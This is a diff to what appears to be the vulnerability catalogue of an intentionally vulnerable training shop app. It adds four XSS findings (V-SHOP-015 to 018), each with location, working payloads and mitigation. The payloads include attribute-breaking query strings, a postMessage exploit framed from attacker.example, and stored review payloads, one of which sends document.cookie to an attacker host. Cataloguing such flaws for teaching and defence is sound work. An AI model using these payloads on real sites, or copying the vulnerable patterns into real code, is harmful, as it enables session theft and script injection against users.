@@ -75,6 +75,51 @@ V-SHOP-014  HTML rendering of support subject in admin
              When admin_kate views /admin the script promotes user 8.
   Mitigation: escape contact form output on render.
 
+V-SHOP-015  Reflected XSS in attribute context on /products/search
+  Location:  views/product_search.ejs  (<input value="<%- qAttr %>">)
+             routes/products.js (qAttr escapes `<` and `>` but NOT `"`)
+  Exploit:   /products/search?q=%22%20autofocus%20onfocus%3Dalert(1)%20x%3D%22
+             ?safe=1 still passes this -- the half-encoder ignores quotes.
+  Mitigation: HTML-attribute escape (`<%= %>` encodes `"` to `&quot;`) or
+              use a context-aware sanitiser.
+
+V-SHOP-016  Reflected XSS with `<>`-only encoder on /products/search?safe=1
+  Location:  routes/products.js (qBody = q.replace(/</,'&lt;').replace(/>/,'&gt;'))
+  Exploit:   The element-body sink is closed under ?safe=1, but the same `q`
+             still lands in the attribute sink unescaped (see V-SHOP-015).
+             The half-fix is worse than no fix: developers think the page is
+             safe and stop reviewing it.
+  Mitigation: never write your own encoder; use the framework's
+              context-aware escapers.
+
+V-SHOP-017  DOM XSS via postMessage with no origin check
+  Location:  public/js/app.js
+             window.addEventListener('message', e => slot.innerHTML = e.data)
+  Exploit:   Frame the shop on attacker.example and post a string:
+               <iframe src="http://127.0.0.1:3002/" id=f></iframe>
+               <script>
+                 f.onload = () => f.contentWindow.postMessage(
+                   '<img src=x onerror=alert(1)>', '*')
+               </script>
+             Or from the shop's own devtools:
+               window.postMessage('<img src=x onerror=alert(1)>', '*')
+  Mitigation: validate `e.origin` against an allow-list; treat `e.data` as
+              opaque untrusted input; use textContent.
+
+V-SHOP-018  Stored XSS via review markdown -- `[text](javascript:...)` + raw HTML
+  Location:  views/product_detail.ejs (renderReviewMd helper)
+  Exploit:   # raw HTML pass-through (the markdown layer does not strip tags):
+             POST /products/1/reviews body=<img src=x onerror=alert(1)>
+             POST /products/1/reviews body=<svg onload=alert(1)>
+             # `javascript:` URI via the [text](url) markdown -- avoid nested
+             # parens because the toy parser stops at the first `)`:
+             POST /products/1/reviews body=[click](javascript:alert`1`)
+             POST /products/1/reviews body=[x](javascript:document.location='//attacker/c?'+document.cookie)
+             # mXSS-style sanitiser confusion (re-parse after markdown layer):
+             body=<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+  Mitigation: use a real markdown library with HTML sanitisation enabled;
+              reject URLs whose scheme is not in {http, https, mailto}.
+
 
 -----------------------------------------------------------------
 AUTHENTICATION & SESSION
